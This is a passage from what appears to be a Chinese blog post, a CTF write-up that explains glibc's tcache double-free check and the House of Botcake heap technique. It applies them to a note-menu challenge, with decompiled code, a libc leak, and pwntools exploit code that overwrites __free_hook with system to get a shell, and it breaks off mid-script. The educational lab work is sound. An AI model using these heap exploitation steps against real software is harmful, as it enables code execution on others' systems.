class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">// 引入key值</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></div><p><code>tcache double free</code>的检查</p><ul><li>2917行</li><li><code>tcache_put</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache; <span class="comment">// 设置该tcache</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">// 计数+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>4181行</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果该chunk非空，tcache bins没填充满，那么该chunk可能已经在tcache bins中了，所以要对其进行double free的检查，即检查key值 */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span> </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 通过检查，放入tcache bins</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx); <span class="comment">// 进入tcache bins就会被设置key</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>__glibc_unlikely</code> 宏是用来告诉编译器特定的条件或分支“不太可能为真”，从而优化生成的机器代码</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当free chunk 进入到tcache bins中的时候，我们会设置一个key值给该chunk，使得double free 检查的时候检查<code>该key值是否存在</code>，如果存在，就是存在double free</p><p><mark>注意<mark>:key值存在的位置是chunk的数据区，有极小可能出现检查错误</mark></mark></p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>既然free chunk被放进tcache就会设置key值，那么我们可以先将tcache bin填满，然后将一个free chunk放到unsorted bin中，接着free一个与unsorted bin chunk相邻的chunk，使其合并，然后malloc一个tcache bin中的chunk，此时tcache bin中就会留下一个剩余，再次free unsorted bin 中chunk即可。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>填满tcache bin ，chunk1<span class="number">-7</span></span><br><span class="line"><span class="number">2.f</span>ree(chunk9) <span class="built_in">malloc</span>(chunk10)-&gt;对应于chunk7,tcache中只有<span class="number">6</span>个chunk了</span><br><span class="line"><span class="number">3.f</span>ree(chunk8) -&gt; 与chunk9合并</span><br><span class="line"><span class="number">4.f</span>ree(chunk9) -&gt; 进入到tcache bin 达到<span class="type">double</span> <span class="built_in">free</span></span><br></pre></td></tr></table></figure></div><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><mark><a class="link" href="http://27.25.151.80:8000/games/2/challenges">build ctf eznote <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><mark></mark></mark></p><p><code>glibc 2.31</code></p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><ul><li>基本的堆菜单，所有功能都可以用</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        dele();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>add<mark></mark></mark></li></ul><p>只能申请15个chunk，并且长度有限制</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  size[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !note[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The size of this note : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &amp;&amp; size[<span class="number">0</span>] &lt;= <span class="number">0x80</span> )<span class="comment">// 长度限制</span></span><br><span class="line">      &#123;</span><br><span class="line">        note[i] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( !note[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The content of this note : &quot;</span>);</span><br><span class="line">        read_input(note[i], size[<span class="number">0</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too large! please try again&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>edit<mark></mark></mark></li></ul><p>漏洞点之一：任意地址写，修改chunk不限制长度</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The size of this content : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf); <span class="comment">// 没有检查长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The content of this note : &quot;</span>);</span><br><span class="line">    read_input(note[v1], v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>show<mark></mark></mark></li></ul><p>%s输出，可以泄露libc</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The content of this note is : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)note[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>free<mark></mark></mark></li></ul><p>漏洞点之二：free之后的指针没有清零，存在uaf和double free</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">dele</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)note[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>漏洞点较为明显，是可以打House Of Botcake的，长度虽然有限制，但是0x80足够进入unsorted bin中</li><li>edit长度不限，可以直接修改相邻chunk的fd和bk指针</li></ul><h2 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h2><p><code>1.填满tcache bin,并泄露libc</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意要先add再free，不然add就是取tcache bin中的chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112625355.bmp"></p><p>直接show就可以获得__malloc_hook+0x70的地址，达到泄露libc</p><p><code>2.打House Of Botcake</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># tcache留下空位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># chunk10</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br></pre></td></tr></table></figure></div><ul><li>free(7)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112740399.bmp"></p><ul><li>add(0x80)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112807185-1730864904515-24.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112656932.bmp"></p><ul><li>free(8)进入tcache（unsorted bin先进先出)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112828023.bmp"></p><p><code>3.利用edit任意改+double free</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>此时再次add，是将tcache bin中末尾即第一次进入unsorted bin中的chunk给malloc出来，修改该chunk的fd为__free_hook，就可以add到free_hook，然后修改其指向的地址</p><ul><li>edit(7,size(payload),payload)，修改tcache bin chunk fd</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113852230.bmp"></p><ul><li>第二次add之前，进行第二次add即可将__free_hook当作fake_chunk</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113915339.bmp"></p><ul><li>第二次add，修改fd为system，即free -&gt; __free_hook-&gt;system，此时执行free,即执行system</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017113934742.bmp"></p><ul><li>最后free(11),即system(‘&#x2F;bin&#x2F;sh’)</li></ul><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=<span class="string">&#x27;gnome-terminal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;27.25.151.80&quot;,38062)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The size of this note : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The content of this note : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 